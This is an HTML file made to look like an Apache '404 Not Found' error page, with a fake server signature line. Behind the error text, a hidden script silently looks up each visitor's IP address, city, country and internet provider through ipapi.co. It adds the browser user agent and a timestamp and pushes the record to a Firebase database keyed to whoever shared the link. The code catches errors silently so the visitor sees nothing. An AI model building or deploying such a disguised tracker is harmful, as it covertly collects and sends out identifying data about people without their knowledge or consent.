<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>
        body { font-family: "Courier New", Courier, monospace; background-color: #fff; color: #000; text-align: center; padding: 50px; }
        h1 { font-size: 50px; margin-bottom: 0; }
        p { font-size: 18px; color: #666; }
        hr { max-width: 500px; border: 0; border-top: 1px solid #ccc; margin: 20px auto; }
    </style>
</head>
<body>
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>Apache/2.4.41 (Ubuntu) Server Port 80</address>

    <script type="module">
        import { db, ref, push } from './firebase-config.js';

        // 1. Extraer ID del dueño
        const urlParams = new URLSearchParams(window.location.search);
        const ownerId = urlParams.get('id');

        async function silentCapture() {
            if (!ownerId) return;

            try {
                // 2. Consulta HTTP silenciosa a la API de IP
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 3. Envío de datos a tu Realtime Database
                const visitorRef = ref(db, 'visitas/' + ownerId);
                await push(visitorRef, {
                    ip: data.ip,
                    ciudad: data.city,
                    pais: data.country_name,
                    isp: data.org,
                    agente: navigator.userAgent,
                    fecha: new Date().toLocaleString()
                });
            } catch (error) {
                // Fallo silencioso, el usuario no verá nada en consola
            }
        }

        silentCapture();
    </script>
</body>
</html>